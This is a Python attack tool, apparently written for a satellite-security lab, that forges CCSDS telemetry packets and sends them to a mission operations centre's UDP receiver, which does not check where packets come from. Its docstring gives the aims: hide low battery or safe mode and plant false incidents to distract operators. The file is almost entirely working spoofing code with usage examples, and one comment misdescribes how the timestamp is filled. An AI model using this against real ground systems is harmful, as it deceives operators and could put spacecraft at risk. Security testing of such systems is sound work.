"""
ccsds_telemetry_spoofer.py - Inject fake CCSDS TM packets into MOC UDP receiver

Usage:
    python3 ccsds_telemetry_spoofer.py --sat SpaceVE-1A --param battery_soc --value 5
    python3 ccsds_telemetry_spoofer.py --sat SpaceVE-1B --param mode --value SAFE --host 192.168.62.10
    python3 ccsds_telemetry_spoofer.py --sat SpaceVE-1A --count 30 --interval 1.0

What it does:
    Sends spoofed binary CCSDS TM packets to the MOC telemetry receiver (UDP port 5000).
    The MOC cannot distinguish spoofed packets from real satellite telemetry because
    MC-SAT-2 / MC-MOC-1: no origin authentication on the UDP receiver.
    The MOC dashboard will reflect the spoofed values in real time.

Attack relevance:
    - Hide a satellite's true state (low battery, SAFING_MODE)
    - Create false incident indicators to distract operators
    - Verify whether the MOC trusts telemetry source without validation

CCSDS TM primary header (6 bytes, big-endian):
    Bits 0-2:   Version (000)
    Bit  3:     Type (0 = TM)
    Bit  4:     Secondary Header Flag (0)
    Bits 5-15:  APID
    Bits 16-17: Sequence Flags (11 = standalone)
    Bits 18-31: Sequence Count
    Bits 32-47: Packet Data Length (payload_len - 1)

TM payload format (36 bytes, struct ">8sHHHhHHhhHhhBBH"):
    cds_timestamp   8 bytes (CCSDS CDS format - set to 8 zero bytes when spoofing)
    mode            uint16   (0=NOMINAL,1=SAFE,2=CAMERA_ON,3=DOWNLINK_ACTIVE,4=REBOOT)
    bat_soc_pm      uint16   (permil, 0-1000)
    bat_mv          uint16   (millivolts)
    solar_ma        int16    (milliamps)
    cpu_pm          uint16   (permil)
    mem_pm          uint16   (permil)
    lat_cdeg        int16    (centidegrees)
    lon_cdeg        int16    (centidegrees)
    alt_dm          uint16   (decameters)
    temp_bat_cdeg   int16    (centidegrees C)
    temp_xpdr_cdeg  int16    (centidegrees C)
    flags           uint8    (bit0=eclipse, bit1=cam, bit2=downlink, bit3=memdump)
    cmd_code        uint8
    cmd_count       uint16
"""

import argparse
import socket
import struct
import time

APID_MAP = {
    "SpaceVE-1A": 0x200,
    "SpaceVE-1B": 0x201,
    "SpaceVE-1C": 0x202,
}

MODE_CODES = {
    "NOMINAL":         0,
    "SAFE":            1,
    "CAMERA_ON":       2,
    "DOWNLINK_ACTIVE": 3,
    "REBOOT":          4,
}

TLM_FMT  = ">8sHHHhHHhhHhhBBH"
TLM_SIZE = struct.calcsize(TLM_FMT)  # 36 bytes - matches satellite TLM_FMT

DEFAULTS = {
    "mission_time_s": 3600,
    "mode":           "NOMINAL",
    "battery_soc":    85.0,
    "battery_v":      28.4,
    "solar_ma":       1200,
    "cpu_pct":        18.0,
    "mem_pct":        32.0,
    "lat":            28.5,
    "lon":            -80.5,
    "alt_km":         400.0,
    "temp_battery_c": 22.0,
    "temp_xpdr_c":    35.0,
    "flags":          0,
    "cmd_code":       0,
    "cmd_count":      0,
}


def clamp(val, lo, hi):
    return int(max(lo, min(hi, val)))


def build_ccsds_tm(apid, seq_count, payload):
    word0 = apid & 0x7FF
    word1 = (0b11 << 14) | (seq_count & 0x3FFF)
    header = struct.pack(">HHH", word0, word1, len(payload) - 1)
    return header + payload


def build_payload(params):
    mode_c = MODE_CODES.get(str(params.get("mode", "NOMINAL")).upper(), 0)
    # First field is 8-byte CDS timestamp (satellite uses cds_now()). Use zeros for spoofed packets.
    cds_ts = struct.pack(">II", int(params.get("mission_time_s", DEFAULTS["mission_time_s"])), 0)
    return struct.pack(
        TLM_FMT,
        cds_ts,
        mode_c,
        clamp(float(params.get("battery_soc", DEFAULTS["battery_soc"])) * 10, 0, 1000),
        clamp(float(params.get("battery_v",   DEFAULTS["battery_v"]))   * 1000, 0, 65535),
        clamp(int(params.get("solar_ma",      DEFAULTS["solar_ma"])),    -32768, 32767),
        clamp(float(params.get("cpu_pct",     DEFAULTS["cpu_pct"]))     * 10, 0, 1000),
        clamp(float(params.get("mem_pct",     DEFAULTS["mem_pct"]))     * 10, 0, 1000),
        clamp(float(params.get("lat",         DEFAULTS["lat"]))         * 100, -9000, 9000),
        clamp(float(params.get("lon",         DEFAULTS["lon"]))         * 100, -18000, 18000),
        clamp(float(params.get("alt_km",      DEFAULTS["alt_km"]))      * 10, 0, 65535),
        clamp(float(params.get("temp_battery_c", DEFAULTS["temp_battery_c"])) * 100, -32768, 32767),
        clamp(float(params.get("temp_xpdr_c",    DEFAULTS["temp_xpdr_c"]))    * 100, -32768, 32767),
        int(params.get("flags",     DEFAULTS["flags"])),
        int(params.get("cmd_code",  DEFAULTS["cmd_code"])),
        int(params.get("cmd_count", DEFAULTS["cmd_count"])),
    )


def send_packet(sock, host, port, apid, seq, params):
    payload = build_payload(params)
    pkt     = build_ccsds_tm(apid, seq, payload)
    sock.sendto(pkt, (host, port))
    return pkt


def print_hex(data, label=""):
    if label:
        print(f"  {label}")
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part  = " ".join(f"{b:02X}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {i:04X}  {hex_part:<47}  {ascii_part}")


def main():
    parser = argparse.ArgumentParser(
        description="Inject spoofed CCSDS TM packets into MOC UDP receiver",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--sat",      default="SpaceVE-1A", choices=list(APID_MAP), help="Target satellite name")
    parser.add_argument("--host",     default="127.0.0.1",  help="MOC TLM receiver host (default: 127.0.0.1)")
    parser.add_argument("--port",     type=int, default=5000, help="MOC TLM UDP port (default: 5000)")
    parser.add_argument("--param",    help="Telemetry parameter to spoof (e.g. battery_soc, mode, lat)")
    parser.add_argument("--value",    help="Value to inject for --param")
    parser.add_argument("--count",    type=int, default=1,   help="Number of packets to send (default: 1)")
    parser.add_argument("--interval", type=float, default=1.0, help="Seconds between packets (default: 1.0)")
    parser.add_argument("--mode",     default=None,         help="Satellite mode override (NOMINAL|SAFE|CAMERA_ON|...)")
    parser.add_argument("--battery",  type=float,           help="Battery SOC percent override (0-100)")
    parser.add_argument("--lat",      type=float,           help="Latitude override")
    parser.add_argument("--lon",      type=float,           help="Longitude override")
    parser.add_argument("--cpu",      type=float,           help="CPU percent override (0-100)")
    args = parser.parse_args()

    apid = APID_MAP[args.sat]
    params = dict(DEFAULTS)

    if args.param and args.value is not None:
        params[args.param] = args.value
    if args.mode:    params["mode"]        = args.mode
    if args.battery is not None: params["battery_soc"] = args.battery
    if args.lat     is not None: params["lat"]         = args.lat
    if args.lon     is not None: params["lon"]         = args.lon
    if args.cpu     is not None: params["cpu_pct"]     = args.cpu

    print(f"[ccsds_telemetry_spoofer]")
    print(f"  Target satellite : {args.sat}  (APID 0x{apid:03X})")
    print(f"  MOC receiver     : {args.host}:{args.port}/udp")
    print(f"  Packets          : {args.count}  interval={args.interval}s")
    if args.param:
        print(f"  Spoofed field    : {args.param} = {args.value}")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    for seq in range(args.count):
        params["mission_time_s"] = DEFAULTS["mission_time_s"] + seq
        try:
            pkt = send_packet(sock, args.host, args.port, apid, seq & 0x3FFF, params)
            sent += 1
            print(f"[{seq+1:04d}] SENT  {len(pkt)} bytes  seq=0x{seq & 0x3FFF:04X}")
            print_hex(pkt)
        except OSError as e:
            print(f"[{seq+1:04d}] FAIL  {e}")
        if args.count > 1 and seq < args.count - 1:
            time.sleep(args.interval)

    sock.close()
    print(f"\n[done] Sent {sent}/{args.count} packets to {args.host}:{args.port}")
    if sent:
        print("       Check MOC dashboard - spoofed values should appear within 1-2 seconds")


if __name__ == "__main__":
    main()
